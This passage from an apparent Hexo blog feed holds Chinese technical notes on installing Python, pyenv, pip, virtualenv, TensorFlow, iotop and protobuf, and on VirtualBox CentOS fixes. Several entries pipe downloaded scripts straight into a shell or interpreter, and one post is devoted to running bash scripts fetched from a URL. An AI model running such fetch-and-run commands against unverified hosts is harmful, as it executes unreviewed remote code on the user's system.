href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="http://man.linuxde.net/rsync">rsync命令</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>gnu-paralell</title>
      <link href="/post/gnu-paralell.html"/>
      <url>/post/gnu-paralell.html</url>
      
        <content type="html"><![CDATA[<p><a href="http://www.jduck.net/blog/2014/09/30/gnu-paralell/">【1】</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>安装Python</title>
      <link href="/post/install-python.html"/>
      <url>/post/install-python.html</url>
      
        <content type="html"><![CDATA[<h2 id="安装Python"><a href="#安装Python" class="headerlink" title="安装Python"></a>安装Python</h2><h3 id="源码安装"><a href="#源码安装" class="headerlink" title="源码安装"></a>源码安装</h3><ol><li><p>下载源码</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.python.org/ftp/python/2.7.12/Python-2.7.12.tgz</span><br></pre></td></tr></table></figure></li><li><p>解压</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf Python-2.7.12.tgz</span><br></pre></td></tr></table></figure></li><li><p>编译安装</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd Python-2.7.12</span><br></pre></td></tr></table></figure> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./configure  </span><br><span class="line">make all</span><br><span class="line">make install</span><br><span class="line">make clean</span><br><span class="line">make distclean</span><br></pre></td></tr></table></figure></li><li><p>建立软连接，使系统默认的 python指向 python2.7</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /usr/local/bin/python2.7 /usr/bin/python  </span><br></pre></td></tr></table></figure></li><li><p>查看版本</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -V</span><br></pre></td></tr></table></figure></li></ol><h3 id="pyenv"><a href="#pyenv" class="headerlink" title="pyenv"></a>pyenv</h3><p>由于Python3和2不兼容，系统中使用的部分软件可能是使用的Python2编写的，例如yum。我们开发中可能又需要使用Python3，如果直接装全局的Python3可能很多软件就无法运行。这种情况下就需要一个Python版本管理软件，pyenv正是解决这种问题的。</p><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p><a href="https://github.com/pyenv/pyenv-installer">https://github.com/pyenv/pyenv-installer</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -L https://github.com/pyenv/pyenv-installer/raw/master/bin/pyenv-installer | bash</span><br></pre></td></tr></table></figure><h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><ol><li><p>pyenv versions：列出系统安装的Python版本</p></li><li><p>pyenv version：查看当前版本</p></li><li><p>pyenv install 3.7.0：安装3.7.0版本到系统</p><p> 如果直接安装太慢可以采用离线安装的方法：</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.python.org/ftp/python/3.7.0/Python-3.7.0.tar.xz -P ~/.pyenv/cache</span><br><span class="line">export PYENV_ROOT=$HOME/.pyenv</span><br><span class="line">pyenv install 3.7.0 </span><br></pre></td></tr></table></figure></li><li><p>pyenv uninstall 3.7.0：卸载3.7.0版本</p></li><li><p>pyenv global 3.7.0：设置全局Python版本</p></li><li><p>pyenv local 3.7.0：设置本地（当前目录）Python版本</p></li><li><p>pyenv shell 3.7.0：设置当前Shell Python版本</p><p> 这个版本的优先级比 local 和 global 都要高。<code>pyenv shell --unset</code>（或者使用<code>unset PYENV_VERSION</code>）用来取消之前的设定。</p></li></ol><h3 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h3><ol><li><p>升级后YUM不能使用</p><p> 编辑<code>/usr/bin/yum</code>，将头部的<code>#!/usr/bin/python</code>改为<code>#!/usr/bin/python2.6</code></p></li><li><p><a href="https://github.com/pypa/pip/issues/1919">zipimport.ZipImportError</a></p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure --prefix= --with-zlib-dir=/usr/local/lib</span><br></pre></td></tr></table></figure></li><li><p>ModuleNotFoundError: No module named ‘_ctypes’</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get install libffi-dev </span><br><span class="line"># or </span><br><span class="line">yum install libffi-devel</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iotop</title>
      <link href="/post/iotop.html"/>
      <url>/post/iotop.html</url>
      
        <content type="html"><![CDATA[<h3 id="iotop命令"><a href="#iotop命令" class="headerlink" title="iotop命令"></a>iotop命令</h3><p>iotop 命令是一个用来监视磁盘 I&#x2F;O 使用状况的 top 类工具。iotop 具有与 top 相似的 UI，其中包括 PID、用户、I&#x2F;O、进程等相关信息。Linux 下的 IO 统计工具如 iostat，nmon 等大多数是只能统计到 per 设备的读写情况，如果你想知道每个进程是如何使用IO的就比较麻烦，使用 iotop 命令可以很方便的查看。</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><h4 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install iotop</span><br></pre></td></tr></table></figure><h4 id="CentOS"><a href="#CentOS" class="headerlink" title="CentOS"></a>CentOS</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install iotop</span><br></pre></td></tr></table></figure><h4 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a>编译安装</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http://guichaz.free.fr/iotop/files/iotop-0.4.4.tar.gz</span><br><span class="line">tar zxf iotop-0.4.4.tar.gz</span><br><span class="line">python setup.py build</span><br><span class="line">python setup.py install</span><br></pre></td></tr></table></figure><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iotop (选项)</span><br></pre></td></tr></table></figure><h3 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-o：只显示有io操作的进程</span><br><span class="line">-b：批量显示，无交互，主要用作记录到文件。</span><br><span class="line">-n NUM：显示NUM次，主要用于非交互式模式。</span><br><span class="line">-d SEC：间隔SEC秒显示一次。</span><br><span class="line">-p PID：监控的进程pid。</span><br><span class="line">-u USER：监控的进程用户。</span><br></pre></td></tr></table></figure><h4 id="iotop常用快捷键："><a href="#iotop常用快捷键：" class="headerlink" title="iotop常用快捷键："></a>iotop常用快捷键：</h4><p>左右箭头：改变排序方式，默认是按IO排序。<br>r：改变排序顺序。<br>o：只显示有IO输出的进程。<br>p：进程&#x2F;线程的显示方式的切换。<br>a：显示累积使用量。<br>q：退出。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://man.linuxde.net/iotop">【1】</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> iotop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pigz</title>
      <link href="/post/pigz.html"/>
      <url>/post/pigz.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://my.oschina.net/uppeng/blog/676813">【1】</a><br><a href="http://www.sergeymarkov.com/blog/2013/07/using-gnu-parallel-to-speed-up-and-simplify-data-analyzes/">【2】</a></p><p><a href="http://blog.csdn.net/xzz_hust/article/details/39183837">【3】</a></p><p><a href="https://linux.die.net/man/1/pigz">【4】</a></p><p><a href="http://www.vaikan.com/use-multiple-cpu-cores-with-your-linux-commands/">【5】</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>VirtualBox-CentOS7</title>
      <link href="/post/virtualbox-contos7.html"/>
      <url>/post/virtualbox-contos7.html</url>
      
        <content type="html"><![CDATA[<h3 id="VirtualBox下CentOS7常见问题"><a href="#VirtualBox下CentOS7常见问题" class="headerlink" title="VirtualBox下CentOS7常见问题"></a>VirtualBox下CentOS7常见问题</h3><h4 id="启动后显示CentOS7-Virtualbox-SMBus-base-address-uninitialized-upgrade-BIOS-or-use-force-addr-0xaddr"><a href="#启动后显示CentOS7-Virtualbox-SMBus-base-address-uninitialized-upgrade-BIOS-or-use-force-addr-0xaddr" class="headerlink" title="启动后显示CentOS7 Virtualbox  SMBus base address uninitialized upgrade BIOS or use force_addr=0xaddr"></a>启动后显示<code>CentOS7 Virtualbox  SMBus base address uninitialized upgrade BIOS or use force_addr=0xaddr</code></h4><p>1、检查一下 <code>i2c_piix4</code> 模块是否存在(一般正常安装都是已经加载的，确认一下比较好)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# lsmod | grep i2c_piix4</span><br><span class="line">i2c_piix4 11098 0</span><br><span class="line">i2c_core 25799 1 i2c_piix4</span><br></pre></td></tr></table></figure><p>2、编辑黑名单文件…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# vi /etc/modprobe.d/blacklist.conf</span><br></pre></td></tr></table></figure><p>3、将下面的语句加入黑名单的最后一行，<code>:wq</code>保存退出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blacklist i2c_piix4</span><br></pre></td></tr></table></figure><p>4、reboot重启系统，那行错误就不见了…</p><h4 id="启动后无网络Network-is-unreachable"><a href="#启动后无网络Network-is-unreachable" class="headerlink" title="启动后无网络Network is unreachable"></a>启动后无网络<code>Network is unreachable</code></h4><p>检查 <code>/etc/sysconfig/network-scripts/ifcfg-enp0s3</code>选项<code>ONBOOT</code>是否为<code>yes</code>。如果不为<code>yes</code>修改为<code>yes</code>然后重启。</p><h4 id="无ifconfig命令"><a href="#无ifconfig命令" class="headerlink" title="无ifconfig命令"></a>无<code>ifconfig</code>命令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y net-tools  </span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://www.slyar.com/blog/mbus-base-address-uninitialized.html">【解决VirtualBox下CentOS启动时”MBus base address uninitialized”错误】</a><br><a href="http://www.centoscn.com/CentosBug/osbug/2014/0916/3750.html">【centos7没有安装ifconfig命令的解决方法】</a><br><a href="https://my.oschina.net/u/1428349/blog/288708">【CentOS 7 下 ifconfig command not found 解决办法】</a><br><a href="https://my.oschina.net/u/1428349/blog/288708">【CentOS 7 Network is unreachable】</a>   </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript数据类型</title>
      <link href="/post/javascript-datetype.html"/>
      <url>/post/javascript-datetype.html</url>
      
        <content type="html"><![CDATA[<h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p>最新的 ECMAScript 标准定义了 7 种数据类型:</p><ul><li>6 种 原始类型:<ul><li>Boolean</li><li>Null</li><li>Undefined</li><li>Number</li><li>String</li><li>Symbol (ECMAScript 6 新定义)</li></ul></li><li>和 Object</li></ul><p>可以使用<code>typeof</code>操作符判断对象类型</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Data_structures">【1】</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>notebook</title>
      <link href="/post/notebook.html"/>
      <url>/post/notebook.html</url>
      
        <content type="html"><![CDATA[<p><a href="http://www.jianshu.com/p/0b7a834b2c1e">【1】</a><br><a href="http://blog.csdn.net/whiterbear/article/details/49356815">【2】</a><br><a href="http://mindonmind.github.io/2013/02/08/ipython-notebook-interactive-computing-new-era/">【3】</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>protobuf</title>
      <link href="/post/protobuf.html"/>
      <url>/post/protobuf.html</url>
      
        <content type="html"><![CDATA[<h3 id="Protocol-Buffers"><a href="#Protocol-Buffers" class="headerlink" title="Protocol Buffers"></a>Protocol Buffers</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm -i -g protobufjs</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pbjs -t json file1.proto file2.proto &gt; bundle.json</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> protobuf = <span class="built_in">require</span>(<span class="string">&#x27;protobufjs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> root = protobuf.<span class="property">Root</span>.<span class="title function_">fromJSON</span>(<span class="built_in">require</span>(<span class="string">&#x27;bundle.json&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">AwesomeMessage</span> = root.<span class="title function_">lookup</span>(<span class="string">&#x27;awesomepackage.AwesomeMessage&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> message = &#123;</span><br><span class="line">    <span class="attr">id</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;类型1&#x27;</span>,</span><br><span class="line">    <span class="attr">status</span>: <span class="string">&#x27;on&#x27;</span>,</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&#x27;type&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buffer = <span class="title class_">AwesomeMessage</span>.<span class="title function_">encode</span>(message).<span class="title function_">finish</span>();</span><br><span class="line"></span><br><span class="line">message = <span class="title class_">AwesomeMessage</span>.<span class="title function_">decode</span>(buffer);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Execute-bash-script-from-URL</title>
      <link href="/post/Execute-bash-script-from-URL.html"/>
      <url>/post/Execute-bash-script-from-URL.html</url>
      
        <content type="html"><![CDATA[<h3 id="curl-脚本并直接执行"><a href="#curl-脚本并直接执行" class="headerlink" title="curl 脚本并直接执行"></a>curl 脚本并直接执行</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash &lt;(curl -s http://mywebsite.com/myscript.txt)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source &lt;(curl -s http://mywebsite.com/myscript.txt)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL &quot;http://mywebsite.com/myscript.sh&quot; | /bin/sh</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://stackoverflow.com/questions/5735666/execute-bash-script-from-url">【1】</a> <a href="https://www.v2ex.com/t/218912">【2】</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> curl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>neuralnetworksanddeeplearning</title>
      <link href="/post/neuralnetworksanddeeplearning.html"/>
      <url>/post/neuralnetworksanddeeplearning.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pip</title>
      <link href="/post/pip.html"/>
      <url>/post/pip.html</url>
      
        <content type="html"><![CDATA[<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -s &quot;https://bootstrap.pypa.io/get-pip.py&quot; | python</span><br><span class="line"></span><br><span class="line"># 或者下载完执行</span><br><span class="line">python get-pip.py</span><br></pre></td></tr></table></figure><h4 id="安装配置"><a href="#安装配置" class="headerlink" title="安装配置"></a>安装配置</h4><p><code>--no-setuptools</code> 不安装setuptools</p><p><code>--no-wheel</code> 不安装wheel</p><h3 id="升级"><a href="#升级" class="headerlink" title="升级"></a>升级</h3><p>Linux or macOS</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -U pip</span><br></pre></td></tr></table></figure><p>Win</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m pip install -U pip</span><br></pre></td></tr></table></figure><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">把当前环境中所有的包及版本写进requirements.txt</span><br><span class="line">pip freeze &gt; requirements.txt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">把requirements.txt里面的包安装一遍</span><br><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://pip.pypa.io/en/stable/installing/">【1】</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python-virtualenv</title>
      <link href="/post/python-virtualenv.html"/>
      <url>/post/python-virtualenv.html</url>
      
        <content type="html"><![CDATA[<h3 id="Virtualenv"><a href="#Virtualenv" class="headerlink" title="Virtualenv"></a>Virtualenv</h3><p>Virtualenv 通过创建独立Python开发环境的工具, 来解决依赖、版本以及间接权限<br>问题。Virtualenv 创建一个拥有自己安装目录的环境(沙箱), 这个环境不与其他虚拟环境共享库, 能够方便的管理python版本和管理python库。</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[sudo] pip install virtualenv</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[sudo] pip install https://github.com/pypa/virtualenv/tarball/develop</span><br></pre></td></tr></table></figure><blockquote><p>pip安装参考<a href="/2016/11/25/pip/">pip</a></p></blockquote><h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><h4 id="创建一个Python虚拟环境"><a href="#创建一个Python虚拟环境" class="headerlink" title="创建一个Python虚拟环境"></a>创建一个Python虚拟环境</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建一个名为deeplearning的目录, 并且安装了deeplearning/bin/python, 创建了lib,include,bin目录,安装了pip</span></span><br><span class="line"></span><br><span class="line">virtualenv deeplearning</span><br></pre></td></tr></table></figure><h4 id="激活环境"><a href="#激活环境" class="headerlink" title="激活环境"></a>激活环境</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Mac &amp; Linux</span></span><br><span class="line">source bin/activate[.sh|.fish|.csh]</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Win</span></span><br><span class="line">打开 activate.bat</span><br></pre></td></tr></table></figure><h4 id="退出环境"><a href="#退出环境" class="headerlink" title="退出环境"></a>退出环境</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deactivate</span><br></pre></td></tr></table></figure><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><h4 id="创建虚拟环境时指定Python版本"><a href="#创建虚拟环境时指定Python版本" class="headerlink" title="创建虚拟环境时指定Python版本"></a>创建虚拟环境时指定Python版本</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">virtualenv ENV3.5 --python=python3.5</span><br></pre></td></tr></table></figure><p>另外</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">virtualenv [OPTIONS] DEST_DIR</span><br><span class="line"></span><br><span class="line">-p PYTHON_EXE, --python=PYTHON_EXE</span><br><span class="line">指定所用的python解析器的版本，比如 --python=python2.5 就使用2.5版本的解析器创建新的隔离环境。</span><br><span class="line">默认使用的是当前系统安装(/usr/bin/python)的python解析器。   </span><br></pre></td></tr></table></figure><h4 id="生成可打包环境"><a href="#生成可打包环境" class="headerlink" title="生成可打包环境"></a>生成可打包环境</h4><p>某些特殊需求下,可能没有网络, 我们期望直接打包一个ENV, 可以解压后直接使用, 这时候可以使用<code>virtualenv --relocatable</code>指令将ENV修改为可更改位置的ENV。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">virtualenv --relocatable ./</span><br></pre></td></tr></table></figure><h4 id="创建一个干净的环境"><a href="#创建一个干净的环境" class="headerlink" title="创建一个干净的环境"></a>创建一个干净的环境</h4><p>加上了参数–no-site-packages，这样，已经安装到系统Python环境中的所有第三方包都不会复制过来。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">virtualenv --no-site-packages ENV</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://www.jianshu.com/p/08c657bd34f1">【1】</a> <a href="http://pythonguidecn.readthedocs.io/zh/latest/dev/virtualenvs.html">【2】</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>tensorflow</title>
      <link href="/post/tensorflow.html"/>
      <url>/post/tensorflow.html</url>
      
        <content type="html"><![CDATA[<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><blockquote><p>建议首先创建一个python虚拟环境。参考：<a href="/2016/11/25/python-virtualenv/">python-virtualenv</a></p></blockquote><h4 id="不同的平台及架构"><a href="#不同的平台及架构" class="headerlink" title="不同的平台及架构"></a>不同的平台及架构</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Ubuntu/Linux 64-bit, CPU only, Python 2.7</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">export</span> TF_BINARY_URL=https://storage.googleapis.com/tensorflow/linux/cpu/tensorflow-0.11.0-cp27-none-linux_x86_64.whl</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Ubuntu/Linux 64-bit, GPU enabled, Python 2.7</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Requires CUDA toolkit 8.0 and CuDNN v5. For other versions, see <span class="string">&quot;Installing from sources&quot;</span> below.</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">export</span> TF_BINARY_URL=https://storage.googleapis.com/tensorflow/linux/gpu/tensorflow-0.11.0-cp27-none-linux_x86_64.whl</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Mac OS X, CPU only, Python 2.7:</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">export</span> TF_BINARY_URL=https://storage.googleapis.com/tensorflow/mac/cpu/tensorflow-0.11.0-py2-none-any.whl</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Mac OS X, GPU enabled, Python 2.7:</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">export</span> TF_BINARY_URL=https://storage.googleapis.com/tensorflow/mac/gpu/tensorflow-0.11.0-py2-none-any.whl</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Ubuntu/Linux 64-bit, CPU only, Python 3.4</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">export</span> TF_BINARY_URL=https://storage.googleapis.com/tensorflow/linux/cpu/tensorflow-0.11.0-cp34-cp34m-linux_x86_64.whl</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Ubuntu/Linux 64-bit, GPU enabled, Python 3.4</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Requires CUDA toolkit 8.0 and CuDNN v5. For other versions, see <span class="string">&quot;Installing from sources&quot;</span> below.</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">export</span> TF_BINARY_URL=https://storage.googleapis.com/tensorflow/linux/gpu/tensorflow-0.11.0-cp34-cp34m-linux_x86_64.whl</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Ubuntu/Linux 64-bit, CPU only, Python 3.5</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">export</span> TF_BINARY_URL=https://storage.googleapis.com/tensorflow/linux/cpu/tensorflow-0.11.0-cp35-cp35m-linux_x86_64.whl</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Ubuntu/Linux 64-bit, GPU enabled, Python 3.5</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Requires CUDA toolkit 8.0 and CuDNN v5. For other versions, see <span class="string">&quot;Installing from sources&quot;</span> below.</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">export</span> TF_BINARY_URL=https://storage.googleapis.com/tensorflow/linux/gpu/tensorflow-0.11.0-cp35-cp35m-linux_x86_64.whl</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Mac OS X, CPU only, Python 3.4 or 3.5:</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">export</span> TF_BINARY_URL=https://storage.googleapis.com/tensorflow/mac/cpu/tensorflow-0.11.0-py3-none-any.whl</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Mac OS X, GPU enabled, Python 3.4 or 3.5:</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">export</span> TF_BINARY_URL=https://storage.googleapis.com/tensorflow/mac/gpu/tensorflow-0.11.0-py3-none-any.whl</span></span><br></pre></td></tr></table></figure><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Python 2</span><br><span class="line">$ sudo pip install --upgrade $TF_BINARY_URL</span><br><span class="line"></span><br><span class="line"># Python 3</span><br><span class="line">$ sudo 